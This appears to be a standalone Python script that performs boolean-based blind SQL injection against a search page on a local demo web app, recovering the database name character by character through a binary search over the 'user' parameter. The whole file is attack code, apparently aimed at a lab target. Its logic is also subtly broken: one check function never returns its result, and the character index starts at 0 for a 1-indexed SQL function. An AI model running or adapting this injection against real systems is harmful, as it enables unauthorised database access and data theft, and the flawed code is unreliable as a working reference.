import requests
import urllib.parse
url = "http://192.168.1.3/demo/search.php"

def get_search_lt(idx, ch): 
    return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) > '{ch}"

def get_search_eq(idx, ch): 
    return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) = '{ch}"

search_eq = "alice' AND (SELECT DATABASE()) = '"

url_success = "http://192.168.1.3/demo/user.php"

def encode_url(url, param):
    params = {
        "user": param
    }

    encoded_params = urllib.parse.urlencode(params)
    final_url = f"{url}?{encoded_params}"
    return final_url

def is_succes(url):
    response = requests.get(url)
    print(response.url == url_success)
    return response.url == url_success


def lower(idx, ch):
    return is_succes(encode_url(url, get_search_lt(idx, ch)))

def eq_char(idx, ch):
    is_succes(encode_url(url, get_search_eq(idx, ch)))

def eq(name):
    return is_succes(encode_url(url, search_eq+name))


def binary_search_char(idx, alphabet):
    lo, hi = 0, len(alphabet) - 1

    while lo <= hi:
        mid = (lo + hi) // 2
        guess = alphabet[mid]
        print(guess)

        if eq_char(idx, guess):
            return guess
        elif lower(idx, guess):
            lo = mid + 1
        else:               
            hi = mid - 1
    print("none")
    return None


def guess_secret():
    alphabet = "".join(chr(i) for i in range(ord('a'), ord('z') + 1))
    name = ""
    idx = 0

    while True:
        if eq(name):
            return name
        print(idx)
        print(name)
        ch = binary_search_char(idx, alphabet)
        if ch is None:
            raise ValueError("Character not found in ASCII!")

        name += ch
        idx += 1


print("Guessed:", guess_secret())
